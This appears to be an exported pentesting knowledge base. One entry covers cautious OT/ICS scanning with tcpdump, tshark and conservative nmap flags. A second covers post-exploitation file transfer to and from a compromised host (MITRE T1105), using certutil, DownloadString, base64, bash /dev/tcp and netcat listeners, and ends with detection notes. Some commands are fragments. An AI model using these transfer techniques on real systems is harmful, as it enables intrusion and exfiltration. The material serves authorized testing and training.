steps.text: Exhaust the passive route first, because on OT it usually works. Process traffic is cyclic and chatty by design — controllers poll their I/O on a fixed interval — so a span port or tap left running for one full process cycle hands you the asset inventory, the master/slave relationships and often the firmware versions without a single packet leaving your interface. That is a better inventory than an active scan would produce, at zero risk.

code.cmd:
tcpdump -i <iface> -nn -s0 -w ot-baseline.pcap

# then read the asset list back out of the capture
tshark -r ot-baseline.pcap -q -z conv,tcp
tshark -r ot-baseline.pcap -Y 'mbtcp || s7comm || cip || bacapp' \
       -T fields -e ip.src -e ip.dst -e _ws.col.Protocol | sort -u

steps.text: If you must go active, the single most important rule is: never -A, and never -sV, against a controller. -A bundles OS fingerprinting, version detection, traceroute and the default script set. Version detection is the specific danger: it works by sending crafted, often protocol-violating payloads and reading the reply, which is precisely the input an embedded stack was never tested against. OS fingerprinting is nearly as bad — it deliberately sends malformed TCP flag combinations. Take the version from the passive capture or from the vendor's own management protocol instead.

code.cmd:
# WRONG on an OT segment - each of these has faulted controllers
# nmap -A <target>
# nmap -sV <target>
# nmap -O <target>

steps.text: Prefer the full connect scan (-sT) over the half-open SYN scan (-sS), which inverts the usual IT advice for a reason. -sS never completes the handshake, so the device is left holding connection state it must time out on its own; a controller with a very small connection table can have every slot consumed by abandoned half-opens and then refuse the legitimate poll from its master. -sT completes and closes the connection properly, which costs you stealth you were not going to get on a quiet OT network anyway.

Serialise everything. --max-parallelism 1 holds nmap to a single outstanding probe rather than the hundreds it will otherwise open, --scan-delay puts a floor between them, and -T2 or -T1 pulls the overall profile down. Add --host-timeout so a device that stops answering ends that host's scan instead of provoking retries against something you may already have hurt. This is slow on purpose — an OT scan is measured in hours.

Widen the port range last, never first. Start from the known OT ports and the handful of IT services you expect (22, 80, 443, 445), confirm the segment tolerates that, and only then consider going broader. -p- against a PLC is the classic way to end a test early. Keep -n so you are not also generating DNS lookups, and -Pn so nmap does not run its own host-discovery probes before the scan you carefully configured.

Agree the abort path before the first packet, and get it into the rules of engagement in writing. That means a named control-room engineer watching the HMI while you scan, a phone line open to them rather than to a ticket queue, an agreed stop word, and a shared understanding that the test stops the moment a process alarm fires — not after you have finished the sweep. Record the exact command and timestamp for every scan you run, so that if something does fault an hour later the question of whether it was you can be answered from evidence.

meta.kb_gap: --max-parallelism 0 hits pre-ingest; ics category held 1 entry, an operator persona

title: Ingress tool transfer (T1105) — choosing a method the target can actually run
summary: You have code execution and a file has to cross in one direction or the other. The question is never 'what are the commands' — every cheat sheet has those — it is WHICH ONE THIS HOST CAN RUN, and in WHICH DIRECTION. Three things decide it: which binaries exist, which way the network will let a connection open, and whether the shell you have can carry the bytes at all. Work down that list and the command falls out; start from the command list and you burn attempts on methods the host was never going to support.

steps.text: DECIDE THE DIRECTION FIRST, because it changes the server you need. Download (attacker -> target) is the easy half: stand something up and have the target pull. Upload (target -> attacker) is the half missing from most notes, and over HTTP it needs an upload-capable server — python3's http.server will not accept a PUT or a POST.

code.cmd: python3 -m uploadserver            # UPLOAD side (pip install uploadserver)

steps.text: WINDOWS, download. Invoke-WebRequest writes to disk; DownloadString never touches it, which matters when something is watching file writes rather than the network. certutil.exe is the LOLBin fallback for a host whose PowerShell is locked down.

WINDOWS, upload — two shapes. Over HTTP: pull PSUpload.ps1 in, POST the file to an uploadserver. Or go through base64, AND KNOW ITS CEILING: a Windows command line caps at 8191 characters, so base64 carries roughly 6 KB of file and no more. That single number is what decides between 'paste it' and 'set up a second channel', and it is the part the cheat sheets leave out.

code.cmd: echo <BASE64> | base64 -d > <file>      # decode on the attacker host
cat <file> | base64 -w 0; echo          # encode FOR Windows

steps.text: LINUX, the ordinary case — wget or curl, plus the FILELESS variants when you want to run something without leaving it on disk. Piping to an interpreter is one technique whether the interpreter is bash or python3.

LINUX WITH NOTHING INSTALLED — the case actually worth remembering. No wget, no curl, no nc, no python. Bash opens a TCP socket itself through /dev/tcp and you write the HTTP request by hand. It is ugly, it has no TLS, and it works on a stripped container where every method above is missing.

code.cmd: cat <&3     # then strip everything before the first blank line

steps.text: NETCAT, AND THE HALF WHERE ONLY ONE END HAS IT. nc-to-nc is easy. The pairing worth knowing is nc on one end and /dev/tcp on the other. Note `-q 0`: it makes the listener close when the sender is done instead of hanging, which is the difference between a transfer that finishes and one you have to guess at.

code.cmd: nc -l -p 443 -q 0 < <file>              # netcat -> NO netcat: attacker sends
nc -lvnp 443 > <remotepath>             # NO netcat -> netcat: attacker receives

steps.text: WHAT IT LOOKS LIKE TO A DEFENDER, because every one of these is signature material. certutil.exe reaching the internet, powershell.exe with DownloadString on its command line, and a bash process holding a socket on /dev/tcp are all high-signal detections. The fileless variants trade a file write for a process-and-network pair rather than avoiding detection. When the engagement is measuring detection rather than moving a file, that difference IS the finding.
